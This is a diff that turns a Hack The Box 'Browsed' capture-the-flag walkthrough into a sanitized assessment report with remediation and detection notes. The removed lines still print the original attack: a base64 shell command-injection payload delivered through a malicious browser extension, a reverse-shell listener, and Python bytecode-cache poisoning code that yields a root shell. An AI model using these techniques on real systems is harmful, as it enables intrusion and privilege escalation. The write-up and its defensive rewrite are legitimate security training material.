@@ -1,179 +1,100 @@
-<div align="center">
+# Browsed — Security Assessment
 
-# 🧩 HTB: Browsed
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Linux |
+| Difficulty | Medium |
+| Assessment date | 2026-01-17 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `linux` `chrome-extension` `ssrf` `command-injection` `pyc-cache-poisoning`
+The notes describe an extension-review workflow reaching an internal application, command execution as larry, and privileged execution through a writable Python import cache.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — A site that lets anyone upload a Chrome extension "for the team to test" is really an SSRF delivery mechanism with extra steps. A malicious extension pivots browser-side access into a command-injection bug in an internal Flask app, landing a shell as `larry`. From there, a writable Python bytecode cache and a sudo-enabled script combine into root.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Linux |
-| 🎯 **Target** | `<TARGET_IP>` (browsed.htb) |
-| 🎚️ **Difficulty** | Medium |
-| 📅 **Date** | January 17, 2026 |
-| 🏁 **Outcome** | ✅ Full compromise |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sVC -p- <TARGET_IP> -T3 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/browsed/{scans,screenshots}
+nmap -sV -p 22,80 -oA evidence/browsed/scans/services "$TARGET_IP"
 ```
 
-| Port | Service |
-|:---:|---|
-| `22` | OpenSSH 9.6p1 (Ubuntu) |
-| `80` | nginx 1.24.0 |
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
-The homepage is a Chrome-extension "submit your extension for review" site — with one very honest disclosure in the page copy:
+## 4. Reconnaissance and service analysis
 
-> *"Once we have a security team, we'll review extensions to make them secure. Don't hesitate to send your samples, the team will use it for daily use and report afterwards their thoughts on it."*
+22 OpenSSH 9.6p1; 80 nginx 1.24.0. Extension samples and an internal Gitea repository informed the investigation.
 
-> ⚠️ Translation: uploaded extensions get **loaded and run by real internal users**, with **no review process at all**. That's a client-side execution primitive handed out for free.
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
 
-A sample extension at `/samples.html` shows the expected shape: `manifest.json` (Manifest V3, minimal permissions) + `content.js`, zipped with files at the archive root. Upload handler: `/upload.php`.
+## 5. Recorded initial-access path
 
----
+The workflow loaded submitted extension code in a browser context. The notes report access to an internal Flask application and execution as uid=1000(larry). Browser-mediated requests should not automatically be classified as server-side SSRF.
 
-## 🚩 Shell as `larry`
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
 
-### Extension upload → hidden internal vhost
+## 6. Privilege escalation and impact validation
 
-Testing the upload flow with a benign extension surfaces something recon alone never would have: Chrome's own network logs from loading the extension reveal a request to `browsedinternals.htb` — an internal vhost never seen in the port scan or web enumeration, running **Gitea v1.24.5**.
+A sudo-authorized Python script imported code from a cache directory writable by the low-privilege account. The recorded transcript reports a root shell. The security boundary failure is untrusted writable code entering privileged execution, rather than Python caching being intrinsically vulnerable.
+
+In an already authorized session, record identity without reading objective contents:
 
 ```bash
-echo "<TARGET_IP> browsedinternals.htb" | sudo tee -a /etc/hosts
-```
-
-### Source disclosure via a public repo
-
-A public Gitea repository, `larry/MarkdownPreview`, exposes `routines.sh` with hardcoded filesystem paths:
-
-- User: `larry` (home: `/home/larry`)
-- App: `/home/larry/markdownPreview/`
-- Subpaths: `data/`, `log/routine.log`, `backups/`, `tmp/`
-
-> 💡 Hardcoding real paths into a script that ends up in a *public* repo turns internal reconnaissance from "guessed" to "handed over."
-
-### The real target: an internal Flask app
-
-Weaponizing the extension to probe internal-only services (`file://` reads plus SSRF-style fetches from the browser context) turns up a Flask app bound to `127.0.0.1:5000` — invisible from outside, but reachable *from inside a browser running the malicious extension.*
-
-`GET /routines/<expr>` evaluates an arithmetic-array-style expression where the index is attacker-controlled — and that index gets shell-expanded:
-
-```javascript
-const B64_CMD = "Y2F0IC9ob21lL2xhcnJ5L3VzZXIudHh0"; // cat /home/larry/user.txt
-const raw_payload = 'arr[$(echo ' + B64_CMD + ' | base64 -d | bash)]';
-```
-
-```
-arr[$(command)]
-```
-
-Any shell-expandable payload inside those brackets executes.
-
-**Weaponized extension → SSRF → RCE, end to end:**
-1. Extension content script fires on any page the internal team visits
-2. It issues a request to `http://127.0.0.1:5000/routines/arr[$(command)]` — a request the *browser* makes, from *inside* the network, on behalf of whoever's testing the extension
-3. Flask evaluates the expression, shells out
-4. Reverse shell callback received
-
-```bash
-# listener
-nc -lvnp 4444
-```
-
-Extension uploaded, internal team loads it, callback lands:
-
-```
-larry@browsed:~$ id
-uid=1000(larry) gid=1000(larry) groups=1000(larry)
-```
-
-**Artifacts:** upload transcript, Gitea repo discovery, Flask RCE payload/callback (see evidence index)
-
----
-
-## 👑 Root — Python Bytecode Cache Poisoning
-
-### The setup
-
-```bash
+id
+hostname
 sudo -l
 ```
 
-`larry` can run `/opt/extensiontool/extension_tool.py` via sudo, no password. That script imports a module, `extension_utils` — and Python's import machinery has a shortcut worth knowing about: if a cached `.pyc` file's **size and mtime metadata** match what it expects for the `.py` source, Python loads the cached bytecode **without re-validating it against the source**.
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-`larry` has write access to the `__pycache__` directory holding that cache.
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-> ⚠️ **Root cause:** Python trusts `__pycache__/*.pyc` metadata over re-checking source integrity. Any user who can write to that directory can plant bytecode that runs with whatever privilege level executes the import — here, root, via sudo.
+## 7. Evidence register and limitations
 
-### Building the poisoned cache
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-```python
-payload = 'import os; print("ROOT SHELL"); os.execl("/bin/bash", "bash", "-p")'
-padding_needed = 1245 - len(payload.encode('utf-8'))  # match original file size exactly
-payload += "#" * padding_needed
+Root shell reported; original screenshot and cache-permission evidence are missing from the reviewed attachments.
 
-py_compile.compile('extension_utils.py', cfile='malicious.pyc')
-shutil.copy('malicious.pyc', '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc')
-```
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/browsed.md), reviewed at blob SHA `c68b8caaf746f3af48ca7533255349102d18d805`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
-The exploit also clones the original file's mtime so the size+timestamp check passes cleanly.
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-```bash
-larry@browsed:/tmp$ python3 ./privesc.py
-[*] Original size: 1245 bytes
-[+] Timestamp cloned
-[+] Injection complete
+## 8. Findings and remediation
 
-larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py
-ROOT SHELL
-root@browsed:/tmp#
-```
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Untrusted extension execution | Review extensions in isolated disposable environments with restricted network access and permissions. |
+| F-002 | Internal application command injection | Replace shell evaluation with structured operations and validate input; authenticate internal services. |
+| F-003 | Writable privileged import path | Make scripts, modules, caches, and parent directories administrator-owned and non-writable to unprivileged users. |
 
-```bash
-root@browsed:/tmp# cat /root/root.txt
-```
-*(root flag captured — value not preserved in original notes; re-run to recapture if needed)*
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
----
+## 9. Detection opportunities
 
-## 📦 Evidence Index
+Extension installation and network activity; internal app child processes; Python cache writes followed by privileged script execution. Tune for approved extension testing and deployments.
 
-| ID | Description |
-|---|---|
-| `EV-001` | Full port scan |
-| `EV-002`–`EV-004` | Upload flow + sample extension analysis |
-| `EV-005` | Extension load triggers `browsedinternals.htb` discovery |
-| `EV-006`–`EV-007` | Gitea repo enumeration, `routines.sh` source disclosure |
-| `EV-008`–`EV-010` | Weaponized extension build, upload, reverse shell as `larry` |
-| `EV-011`–`EV-013` | Sudo enumeration, bytecode-poisoning exploit, root shell |
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-## 🛠️ Remediation
+## 10. Remediation validation
 
-| Finding | Fix |
-|---|---|
-| Unreviewed extension upload run by internal users | Stand up an actual review process before any "submit for testing" feature goes live — this is executable code, treat it like one. |
-| Internal Flask app command injection | Never shell-expand user input; use parameterized/whitelisted array access instead of `eval`-adjacent indexing. |
-| Internal service reachable via browser SSRF | Segment internal-only services from anything a browser (even an internal one) can reach; require auth even on localhost-bound services. |
-| Public repo with hardcoded internal paths | Scrub paths from source, use env vars/config, and audit repos for this class of leak. |
-| Writable `__pycache__` on a sudo-enabled script | Lock cache directory permissions to root-only write; avoid running privileged Python scripts whose import path is user-writable anywhere. |
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
----
+## 11. Lessons learned and remaining work
 
-<div align="center">
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
-
-</div>
+[Back to walkthrough inventory](./README.md)
